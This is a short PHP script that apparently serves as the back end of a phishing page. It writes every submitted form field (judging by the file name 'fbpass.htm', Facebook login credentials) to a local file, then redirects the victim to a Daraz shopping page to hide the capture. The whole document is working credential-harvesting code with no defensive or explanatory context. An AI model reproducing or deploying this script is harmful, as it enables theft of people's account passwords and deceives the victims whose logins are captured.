<?php
header ('Location:https://www.daraz.pk/amazing-finds-trending-500/?source=hptaf');
$handle = fopen("fbpass.htm", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "<br>");
}
fwrite($handle, "<hr>");
fclose($handle);
exit;
?>